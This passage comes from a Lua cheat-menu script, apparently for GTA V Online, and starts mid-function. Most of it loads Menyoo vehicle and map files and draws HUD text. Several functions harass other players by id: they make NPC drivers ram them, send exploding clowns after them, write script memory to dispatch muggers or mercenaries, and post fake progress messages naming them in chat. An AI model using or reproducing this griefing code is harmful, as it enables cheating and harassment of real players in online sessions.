    VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
    VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
end
function nearcarkill(pid)
    if not is_player_active(pid, false, true) then
        return util.stop_thread()
    end
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for _, vehicle in ipairs(get_vehicles_in_player_range(pid, 70.0)) do
        if TASK.GET_ACTIVE_VEHICLE_MISSION_TYPE(vehicle) ~= 6 then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
            if ENTITY.DOES_ENTITY_EXIST(driver) and not PED.IS_PED_A_PLAYER(driver) then
                request_control_once(driver)
                PED.SET_PED_MAX_HEALTH(driver, 300)
                ENTITY.SET_ENTITY_HEALTH(driver, 300, 0)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
                TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, targetPed, 6, 100.0, 0, 0.0, 0.0, true)
            end
        end
    end
end
function creep(pid)
    local hash <const> = util.joaat("s_m_y_clown_01")
		local explosion <const> = Effect.new("scr_rcbarry2", "scr_exp_clown")
		local appears <const> = Effect.new("scr_rcbarry2",  "scr_clown_appears")
		request_model(hash)
		local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player, false)
		local coord = get_random_offset_from_entity(player, 5.0, 8.0)
		coord.z = coord.z - 1.0
		local ped = entities.create_ped(0, hash, coord, 0.0)
		request_fx_asset(appears.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(appears.asset)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			appears.name,
			ped,
			0.0, 0.0, -1.0,
			0.0, 0.0, 0.0,
			0.5, false, false, false
		)
		set_entity_face_entity(ped, player, false)
		PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
		TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, pos.x, pos.y, pos.z, 5.0, 0, false, 0, 0.0)
		local dest = pos
		PED.SET_PED_KEEP_TASK(ped, true)
		AUDIO.STOP_PED_SPEAKING(ped, true)
		util.create_tick_handler(function()
			local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
			local targetPos = players.get_position(pid)
			if not ENTITY.DOES_ENTITY_EXIST(ped) or PED.IS_PED_FATALLY_INJURED(ped) then
				return false
			elseif pos:distance(targetPos) > 150 and
			request_control(ped) then
				entities.delete_by_handle(ped)
				return false
			elseif pos:distance(targetPos) < 3.0 and request_control(ped) then
				request_fx_asset(explosion.asset)
				GRAPHICS.USE_PARTICLE_FX_ASSET(explosion.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					explosion.name,
					pos.x, pos.y, pos.z,
					0.0, 0.0, 0.0,
					1.0,
					false, false, false, false
				)
				FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, true, 1.0, false)
				ENTITY.SET_ENTITY_VISIBLE(ped, false, false)
				entities.delete_by_handle(ped)
				return false
			elseif targetPos:distance(dest) > 3.0 and request_control_once(ped) then
				dest = targetPos
				TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, targetPos.x, targetPos.y, targetPos.z, 5.0, 0, false, 0, 0.0)
			end
		end)
    end
function sendmugger_npc(pid)
    if NETWORK.NETWORK_IS_SESSION_STARTED() and is_player_active(pid, true, true) and
    not is_player_in_interior(pid) then
        if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
            local bits_addr = memory.script_global(1853348 + (players.user() * 834 + 1) + 140)
            memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 0))
            write_global.int(1853348 + (players.user() * 834 + 1) + 141, pid)
        else
            notification("劫匪已经开始活动", HudColour.red)
        end
    end
end
function sendkiller(pid)
    if NETWORK.NETWORK_IS_SESSION_STARTED() and is_player_active(pid, true, true) and
    not is_player_in_interior(pid) then
        if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 1, true, 0) then
            local bits_addr = memory.script_global(1853348 + (players.user() * 834 + 1) + 140)
            memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 1))
            write_global.int(1853348 + (players.user() * 834 + 1) + 141, pid)
        else
            notification("雇佣兵已经开始活动", HudColour.red)
        end
    end
end
function draw_name(s, x, y, scale, font)
	HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
	HUD.SET_TEXT_FONT(4)
	HUD.SET_TEXT_SCALE(scale, scale)
	HUD.SET_TEXT_DROP_SHADOW()
	HUD.SET_TEXT_WRAP(0.0, 1.0)
	HUD.SET_TEXT_DROPSHADOW(1, 0, 0, 0, 0)
	HUD.SET_TEXT_OUTLINE()
	HUD.SET_TEXT_EDGE(1, 0, 0, 0, 0)
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(s)
	HUD.END_TEXT_COMMAND_DISPLAY_TEXT(x, y)
end
local fps = 0
util.create_thread(function()
    while true do
        fps = math.ceil(1/SYSTEM.TIMESTEP())
        wait(1000)
    end
end)
function xianshijiaoben(state)
    jiaoben_x = 0.01
    jiaoben_y = 0.160
    jiaoben_dx = 0.800
    sname = state
    util.create_thread(function ()
        while sname do
            if mcxh == 1 and mcg < 256 then
                HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)
                if mcg == 255 then
                    mcxh = 2
                else
                    mcg = mcg + 1
                end
            elseif mcxh == 2 and mcr > -1 then
                HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)
                if mcr == 0 then
                    mcxh = 3
                else
                    mcr = mcr - 1
                end
            elseif mcxh == 3 and mcb < 256 then
                HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)
                if mcb == 255 then
                    mcxh = 4
                else
                    mcb = mcb + 1
                end
            elseif mcxh == 4 and mcg > -1 then
                HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)
                if mcg == 0 then
                    mcxh = 5
                else
                    mcg = mcg - 1
                end
            elseif mcxh == 5 and mcr < 256 then
                HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)
                if mcr == 255 then
                    mcxh = 6
                else
                    mcr = mcr + 1
                end
            elseif mcxh == 6 and mcb > -1 then
                HUD.SET_TEXT_COLOUR(mcr, mcg, mcb, 255)
                if mcb == 0 then
                    mcxh = 1
                else
                    mcb = mcb - 1
                end
            end
            color = colorLocked and lockedColor or { r = mcr, g = mcg, b = mcb }
            HUD.SET_TEXT_COLOUR(color.r, color.g, color.b, 255)
            draw_name(string.format("~italic~~h~\nGRANDTOURINGVIP\n"), jiaoben_x, jiaoben_y, jiaoben_dx, 2)
            color = colorLocked and lockedColor or { r = mcr, g = mcg, b = mcb }
            HUD.SET_TEXT_COLOUR(color.r, color.g, color.b, 255)
            draw_name(string.format("~italic~~h~\n"), jiaoben_x + 0.015, jiaoben_y + 0.0575, jiaoben_dx - 0.2, 2)
            wait()
        end    
    end)
end
function STAT_GET_FLOAT(Stat)
    local FloatPTR = memory.alloc(4)
    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_GET_FLOAT(util.joaat(Stat), FloatPTR, -1)
    else
        STATS.STAT_GET_FLOAT(util.joaat(MP_INDEX() .. Stat), FloatPTR, -1)
    end
    return tonumber(string.format("%.3f", memory.read_float(FloatPTR)))
end
function TELEPORT(X, Y, Z)
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), X, Y, Z)
end
function cshj()
    if STAT_GET_INT("IH_SUB_OWNED") == 0 then
        NOTIFY(TRANSLATE("先把虎鲸喊出来！"))
    else
        TELEPORT(1561.2369, 385.8771, -49.689915)
        SET_HEADING(175)
    end
end
function SET_HEADING(Heading)
    ENTITY.SET_ENTITY_HEADING(players.user_ped(), Heading)
end
function STAT_GET_BOOL(Stat)
    local BoolPTR = memory.alloc(1)
    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_GET_BOOL(util.joaat(Stat), BoolPTR, -1)
    else
        STATS.STAT_GET_BOOL(util.joaat(MP_INDEX() .. Stat), BoolPTR, -1)
    end
    if memory.read_byte(BoolPTR) == 1 then
        return "true"
    else
        return "false"
    end
end
local function get_random_joke()
    local joke = 'WIP'
    local in_progress = true
    async_http.init('icanhazdadjoke.com', '', function(data)
        joke = data
    end, function()
        joke = 'FAIL'
    end)
    async_http.add_header('Accept', 'text/plain')
    async_http.dispatch()
    while joke == "WIP" do 
        wait()
    end
    return joke
end
local function fake_chat_with_percentage_and_target(action)
    chat.send_message(action .. " ${name}. [||||            ] (25%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||        ] (50%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||    ] (75%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||||| ] (89%)", false, true, true)
    wait(math.random(3000, 5000))
end
-------------------------------------``
-- FILE LIST
-------------------------------------
FileList = {
	dir = "",
	ext = "json",
	open = false,
	reference = 0,
	options = {},
	fileOpts = {},
	onClick = nil
}
FileList.__index = FileList
function FileList.new(parent, name, options, dir, ext, onClick)
	local self = setmetatable({dir = dir, ext = ext, options = options}, FileList)
	self.fileOpts = {}
	self.onClick = onClick
	self.reference = menu.list(parent, name, {}, "", function()
		self.open = true
		self:load()
	end, function()
		self.open = false
		self:clear()
	end)
	return self
end
function FileList:load()
	if not self.dir or not filesystem.exists(self.dir) then
		return
	end
	for _, path in ipairs(filesystem.list_files(self.dir)) do
		local name, ext = string.match(path, '^.+\\(.+)%.(.+)$')
		if not self.ext or self.ext == ext then self:createOpt(name, path) end
	end
end
function FileList:createOpt(fileName, path)
	local list = menu.list(self.reference, fileName, {}, "")
	for i, opt in ipairs(self.options) do
		menu.action(list, opt, {}, "", function() self.onClick(i, fileName, path) end)
	end
	self.fileOpts[#self.fileOpts+1] = list
end
function FileList:clear()
	if #self.fileOpts == 0 then
		return
	end
	for i, ref in ipairs(self.fileOpts) do
		menu.delete(ref); self.fileOpts[i] = nil
	end
end
function FileList:add(file, content)
	assert(self.dir ~= "", "tried to add a file to a null directory")
	if not filesystem.exists(self.dir) then
		filesystem.mkdir(self.dir)
	end
	local name, ext = string.match(file, '^(.+)%.(.+)$')
	local count = 1
	while filesystem.exists(self.dir .. file) do
		count = count + 1
		file = string.format("%s (%s).%s", name, count, ext)
	end
	local file <close> = assert(io.open(self.dir .. file, "w"))
	file:write(content)
end
function FileList:reload()
	self:clear()
	self:load()
end
---生成选项
slaxdom = require("lib.GTlib.X")
slaxml = require("lib.GTlib.Y")
lunajson = require("lib.GTlib.L")
local iniparser = require("lib.GTlib.S")
fail_text = "这文件不可以加载，可能是你妈的格式错了.滚去 Discord 上提交一份错误报告，并附上你刚刚尝试加载的载具文件."
instruction_text = "\n按住shift和ctrl，然后点击一个载具，从你的目录中删除这个载具.按住空格，点击一个载具，添加到你的收藏夹."
function request_anim_dict(dict)
    request_time = os.time()
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return
    end
    STREAMING.REQUEST_ANIM_DICT(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end
function renzhepao(on)
local renzhe = "missfbi1"
    local pao = "ledge_loop"
            while not STREAMING.HAS_ANIM_DICT_LOADED(renzhe) do 
                STREAMING.REQUEST_ANIM_DICT(renzhe)
                wait()
            end
            if on then
                menu.trigger_commands("walkspeed 3.1")
                menu.trigger_commands("superrun 0.75")
                menu.trigger_commands("grace on")
                TASK.TASK_PLAY_ANIM(players.user_ped(), renzhe, pao, 3, 3, -1, 51, 0, false, false, false)
                PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
            else
                menu.trigger_commands("walkspeed 1")
                menu.trigger_commands("superrun 0")
                menu.trigger_commands("grace off")
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
            end
        end
        function caidancargun()
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local entity = get_entity_player_is_aiming_at(players.user())
            if entity ~= NULL and ENTITY.IS_ENTITY_A_VEHICLE(entity) and request_control(entity, 1000) then
                local primary, secundary = get_random_colour(), get_random_colour()
                VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(entity, primary.r, primary.g, primary.b)
                VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(entity, secundary.r, secundary.g, secundary.b)
            end
        end
    end
function kxq()
    local hash <const> = util.joaat("weapon_airstrike_rocket")
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local pos = raycastResult.endCoords
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			players.user_ped(), true, false, 2500.0
		)
	end
end
function shechuNPC()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
	local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
	if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then 
		pedspawn = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
		ENTITY.SET_ENTITY_ROTATION(pedspawn, rot.x, rot.y, rot.z, 1, false)
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(pedspawn, 1, 0, 1000, 0, false, true, true, true)
	end
end
function hasValue( tbl, str )
    local f = false
    for i = 1, #tbl do
        if type( tbl[i] ) == "table" then
            f = hasValue( tbl[i], str )  --  return value from recursion
            if f then break end  --  if it returned true, break out of loop
        elseif tbl[i] == str then
            return true
        end
    end
    return f
end
-- credit to https://stackoverflow.com/questions/1426954/split-string-in-lua
function split_str(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end
function to_boolean(text)
    if text == 'true' or text == "1" then
        return true
    end
    return false
end
function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end
store_dir = filesystem.scripts_dir() .. '\\GTLuaScript\\'
vehicles_dir = store_dir .. '\\vehicles\\'
if not filesystem.is_dir(vehicles_dir) then
    filesystem.mkdir(vehicles_dir)
end
maps_dir = store_dir .. '\\maps\\'
if not filesystem.is_dir(maps_dir) then
    filesystem.mkdir(maps_dir)
end
function parse_xml(path)
    -- does this path even exist?
    if not filesystem.exists(path) then
        gtoast("错误XML文件.文件不存在?")
        return
    end
    -- break file into string
    local xml = io.open(path):read('*all')
    -- dom that shit ;)
    local dom = slaxdom:dom(xml, {stripWhitespace=true})
    -- return our dominant superior ;)
    return dom
end
all_vehicles = {}
all_maps = {}
favorite_vehicles = {}
favorite_maps = {}
function search_vehicle(query)
    local finds = {}
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        local v_name = path:gsub(vehicles_dir, '')
        if string.endswith(v_name, '.ini') or string.endswith(v_name, '.xml') or string.endswith(v_name, '.json') then
            if string.contains(string.lower(v_name), query) then
                finds[#finds + 1] = v_name
            end
        end
    end
    return finds
end
function search_map(query)
    local finds = {}
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        local m_name = path:gsub(maps_dir, '')
        if string.endswith(m_name, '.xml')then
            if string.contains(string.lower(m_name), query) then
                finds[#finds + 1] = m_name
            end
        end
    end
    return finds
end
local v_search_results_action 
local m_search_results_action
function get_file_type(file_path)
    local _, _, ext = string.match(file_path, "(.-)([^\\/]-%.?)[.]([^%.\\/]*)$")
    return ext
end
function load_vehicle(path)
    local ext = get_file_type(path) 
    pluto_switch ext do 
        case "xml": 
            menyoo_load_vehicle(path)
            break 
        case "ini":
            ini_load_vehicle(path:gsub(vehicles_dir, ''))
            break 
        case "json":
            json_load_vehicle(path)
            break 
        default:
            gtoast("这文件不支持 滚吧.")
    end
end
function load_map(path)
    local ext = get_file_type(path) 
    pluto_switch ext do 
        case "xml": 
            menyoo_load_map(path)
            break
        default:
            gtoast("This is not a supported file.")
    end
end
function favorite_vehicle(file_name)
    local full_path = vehicles_dir .. '\\' .. file_name
    local half_path = vehicles_dir .. '\\'
    os.rename(full_path, half_path .. '[F] ' .. file_name)
    gtoast(file_name .. " 添加到收藏夹!")
    get_all_vehicles_in_dir()
end
function favorite_map(file_name)
    local full_path = maps_dir .. '\\' .. file_name
    local half_path = maps_dir .. '\\'
    os.rename(full_path, half_path .. '[F] ' .. file_name)
    gtoast(file_name .. " 添加到收藏夹!")
    get_all_maps_in_dir()
end
function menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
    local ped_data = {}
    isped = true
    entity = ped
    menyoo_preprocess_entity(ped, att_data)
    if #entity_initial_handles > 0 then
        entity_initial_handles[att_data['InitialHandle']] = ped
    end
    for a,b in pairs(att_data['PedProperties'].kids) do
        local name = b.name
        local val = get_element_text(b)
        if name == 'PedProps' or name == 'PedComps' or name == 'TaskSequence' then
            ped_data[name] = b 
        else
            ped_data[name] = val
        end
    end
    local task_data = {}
    if att_data['TaskSequence'] ~= nil then
        for a,b in pairs(att_data['TaskSequence'].kids) do
            for c,d in pairs(b.kids) do
                task_data[d.name] = get_element_text(d)
            end
        end
    end
    local props = menyoo_build_properties_table(ped_data['PedProps'].kids)
    for k,v in pairs(props) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_PROP_INDEX(ped, k, tonumber(v[1]), tonumber(v[2]), true)
    end
    local comps = menyoo_build_properties_table(ped_data['PedComps'].kids)
    for k,v in pairs(comps) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_COMPONENT_VARIATION(ped, k, tonumber(v[1]), tonumber(v[2]), tonumber(v[2]))
    end
    PED.SET_PED_CAN_RAGDOLL(ped, to_boolean(ped_data['CanRagdoll']))
    PED.SET_PED_ARMOUR(ped, ped_data['Armour'])
    WEAPON.GIVE_WEAPON_TO_PED(ped, ped_data['CurrentWeapon'], 999, false, true)
    -- skipping over relationship groups, fuck that shit, seriously
    -- anim shit
    if task_data['AnimDict'] ~= nil then
        request_anim_dict(task_data['AnimDict'])
        local duration = tonumber(task_data['Duration'])
        local flag = tonumber(task_data['Flag'])
        local speed = tonumber(task_data['Speed'])
        TASK.TASK_PLAY_ANIM(ped, task_data['AnimDict'], task_data['AnimName'], 8.0, 8.0, duration, flag, speed, false, false, false)
    elseif ped_data['AnimDict'] ~= nil then
        request_anim_dict(ped_data['AnimDict'])
        TASK.TASK_PLAY_ANIM(ped, ped_data['AnimDict'], ped_data['AnimName'], 8.0, 8.0, -1, 1, 1.0, false, false, false)
    end
end
function nil_handler(val, default)
    if val == nil then
        val = default
    end
    return val
end
function menyoo_preprocess_car(vehicle, data)
    local colors = menyoo_build_properties_table(data['Colours'].kids)
    local neons = menyoo_build_properties_table(data['Neons'].kids)
    local doorsopen = menyoo_build_properties_table(data['DoorsOpen'].kids)
    local doorsbroken = menyoo_build_properties_table(data['DoorsBroken'].kids)
    if data['TyresBursted'] ~= nil then
        local tyresbursted = menyoo_build_properties_table(data['TyresBursted'].kids)
        for k,v in pairs(tyresbursted) do
            -- fucking menyoo.. here they go mixing up wheel indexes with strings
            k = k:gsub('_', '')
            local cure_menyoo_aids = {['FrontLeft'] = 0, ['FrontRight'] = 1, [2] = 2, [3] = 3, ['BackLeft'] = 4, ['BackRight'] = 5, [6]=6, [7]=7, [8]=8}
            --修复 VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, cure_menyoo_aids[k], false, 0.0)
        end
    end
    local mods = menyoo_build_properties_table(data['Mods'].kids)
    local mod_extras = menyoo_build_properties_table(data['ModExtras'].kids)
    if mod_extras ~= nil then 
        for k,v in pairs(mod_extras) do
            k = k:gsub('_', '')
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, k, not to_boolean(v))
        end
    end
    for k,v in pairs(neons) do
        local comp = {['Left']=0, ['Right']=1, ['Front']=2, ['Back']=3}
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, comp[k], to_boolean(v))
    end
    VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, tonumber(data['WheelType']))
    for k,v in pairs(mods) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        VEHICLE.SET_VEHICLE_MOD(vehicle, tonumber(k), tonumber(v[1]), to_boolean(v[2]))
    end
    for k,v in pairs(colors) do
        colors[k] = tonumber(v)
    end
    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors['Primary'], colors['Secondary'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors['Pearl'], colors['Rim'])
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colors['tyreSmoke_R'], colors['tyreSmoke_G'], colors['tyreSmoke_B'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, colors['LrInterior'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, colors['LrDashboard'])
    local livery = tonumber(data['Livery'])
    if livery == -1 then
        livery = 0
    end
    VEHICLE.SET_VEHICLE_LIVERY(vehicle, livery)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, data['NumberPlateText'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, tonumber(data['NumberPlateTextIndex']))
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, tonumber(data['WindowTint']))
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, to_boolean(data['BulletProofTyres']))
    VEHICLE. SET_VEHICLE_DIRT_LEVEL(vehicle, tonumber(data['DirtLevel']))
    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, tonumber(data['PaintFade']))
    VEHICLE.SET_CONVERTIBLE_ROOF_LATCH_STATE(vehicle, tonumber(data['RoofState']))
    VEHICLE.SET_VEHICLE_SIREN(vehicle, to_boolean(data['SirenActive']))
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, to_boolean(data['EngineOn']), true, false)
    AUDIO.SET_VEHICLE_RADIO_LOUD(vehicle, to_boolean(data['IsRadioLoud']))
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, tonumber(data['LockStatus']))
    if data['EngineHealth'] ~= nil then
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, tonumber(data['EngineHealth']))
    end
end
function menyoo_build_properties_table(kids)
    if kids ~= nil then
        local table = {}
        for k,v in pairs(kids) do
            local name = v.name
            local val = get_element_text(v)
            table[name] = val
        end
        return table
    end
    return nil
end
function menyoo_load_map(path)
    local all_entities = {}
    gtoast("地图在加载别猴急！！！！！！！!...")
    local entity_initial_handles = {}
    local xml_tbl = parse_xml(path).root
    local data = {}
    for a,b in pairs(xml_tbl.kids) do
        local vproperties = {}
        local pproperties = {}
        local name = b.name
        local isvehicle = false
        local isped = false
        if name == 'ReferenceCoords' then
            for k,v in pairs(b.kids) do
                if v.name == 'X' then
                    mmblip_x = tonumber(get_element_text(v))
                elseif v.name == 'Y' then
                    mmblip_y = tonumber(get_element_text(v))
                elseif v.name == 'Z' then
                    mmblip_z = tonumber(get_element_text(v))
                end
            end
            mmblip = HUD.ADD_BLIP_FOR_COORD(mmblip_x, mmblip_y, mmblip_z)
            HUD.SET_BLIP_SPRITE(mmblip, 77)
            HUD.SET_BLIP_COLOUR(mmblip, 48)
        end
        if name == 'Placement' then
            for c,d in pairs(b.kids) do
                if d.name == 'PositionRotation' then
                    for e, f in pairs(d.kids) do
                        data[f.name] = get_element_text(f)
                    end
                elseif d.name == 'VehicleProperties' then
                    isvehicle = true
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                elseif d.name == 'PedProperties' then
                    isped = true
                    pproperties[d.name] = d
                else
                    data[d.name] = get_element_text(d)
                end
            end
            mmpos = {}
            mmpos.x = tonumber(data['X'])
            mmpos.y = tonumber(data['Y'])
            mmpos.z = tonumber(data['Z'])
            mmrot = {}
            mmrot.pi = tonumber(data['Pitch'])
            mmrot.ro = tonumber(data['Roll'])
            mmrot.ya = tonumber(data['Yaw'])
            if STREAMING.IS_MODEL_VALID(data['ModelHash']) then
                local mment = 0
                if isvehicle then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_vehicle(data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_entity(mment, data)
                    menyoo_preprocess_car(mment, vproperties)
                elseif isped then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_ped(0, data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_ped(mment, pproperties, {})
                    menyoo_preprocess_entity(mment, data)
                else
                    request_model_load(data['ModelHash'])
                    mment = entities.create_object(data['ModelHash'], mmpos)
                    menyoo_preprocess_entity(mment, data)
                end
                table.insert(all_entities, mment)
                ENTITY.SET_ENTITY_ROTATION(mment, mmrot.pi, mmrot.ro, mmrot.ya, 2, true)
            else
                gtoast("发现一些无效的模型.确保你没有使用需要mods文件的XML.")
            end
        end
    end
    if mmblip == nil then 
        gtoast("这张图在加载时出了问题.请确保该XML是Menyoo制作的XML.")
        return 
    end
    mm_maproot = menu.list(loaded_maps_root, path:gsub(maps_dir, "") .. ' [' .. mmblip .. ']', {"lancespoonerloadedmaps" .. mmblip}, "加载过了奶奶的")
    menu.action(mm_maproot, "传送至此地图", {"menyoomteleportto" .. mmblip}, "传送至此地图.", function(on_click)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mmpos.x, mmpos.y, mmpos.z, false, false, false)
    end)
    menu.action(mm_maproot, "删除地图", {"menyoomdelete" .. mmblip}, "", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(mm_maproot)
        -- apparently remove blip is fucked, so we set sprite to invis as a failsafe
        util.remove_blip(mmblip)
    end)
    gtoast("地图他妈的加载完成.在地图上寻找一个粉粉的L.")
end
function menyoo_preprocess_entity(entity, data)
    data['Dynamic'] = nil_handler(data['Dynamic'], true)
    data['FrozenPos'] = nil_handler(data['FrozenPos'], true)
    data['OpacityLevel'] = nil_handler(data['OpacityLevel'], 255)
    data['IsInvincible'] = nil_handler(data['IsInvincible'], false)
    data['IsVisible'] = nil_handler(data['IsVisible'], true)
    data['HasGravity'] = nil_handler(data['HasGravity'], false)
    data['IsBulletProof'] = nil_handler(data['IsBulletProof'], false)
    data['IsFireProof'] = nil_handler(data['IsFireProof'], false)
    data['IsExplosionProof'] = nil_handler(data['IsExplosionProof'], false)
    data['IsMeleeProof'] = nil_handler(data['IsMeleeProof'], false)
    ENTITY.FREEZE_ENTITY_POSITION(entity, to_boolean(data['FrozenPos']))
    ENTITY.SET_ENTITY_ALPHA(entity, tonumber(data['OpacityLevel']), false)
    ENTITY.SET_ENTITY_INVINCIBLE(entity, to_boolean(data['IsInvincible']))
    ENTITY.SET_ENTITY_VISIBLE(entity, to_boolean(data['IsVisible']), 0)
    ENTITY.SET_ENTITY_HAS_GRAVITY(entity, to_boolean(data['HasGravity']))
    ENTITY.SET_ENTITY_PROOFS(entity, to_boolean(data['IsBulletProof']), to_boolean(data['IsFireProof']), to_boolean(data['IsExplosionProof']), false, to_boolean(data['IsMeleeProof']), false, true, false)
end
function menyoo_load_vehicle(path)
    our_ped = players.user_ped()
    local all_entities = {}
    local entity_initial_handles = {}
    local data = {}
    local vproperties = {}
    local xml_tbl = parse_xml(path).root
    local initial_handle_index = 0
    -- n appears to be the enum of the kid, k is the actual kid table
    for k,v in pairs(xml_tbl.kids) do
        local name = v.name
        if name == 'VehicleProperties' then
            for n, p in pairs(v.kids) do
                local prop_name = p.name
                if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                    vproperties[prop_name] = p
                else
                    vproperties[prop_name]  = get_element_text(p)
                end
            end
        else
            if name == 'SpoonerAttachments' then
                data[name] = v
            else
                local el_text = get_element_text(v)
                data[name] = el_text
            end
        end
    end
    if data['ModelHash'] == nil then 
        gtoast(fail_text)
        return 
    end
    request_model_load(data['ModelHash'])
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(our_ped, 0.0, 5.0, 0.0)
    local vehicle = entities.create_vehicle(data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(our_ped))
    table.insert(all_entities, vehicle)
    ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
    PED.SET_PED_INTO_VEHICLE(our_ped, vehicle, -1)
    if data['InitialHandle'] == nil then
        initial_handle_index = initial_handle_index + 1
        data['InitialHandle'] = initial_handle_index
    end
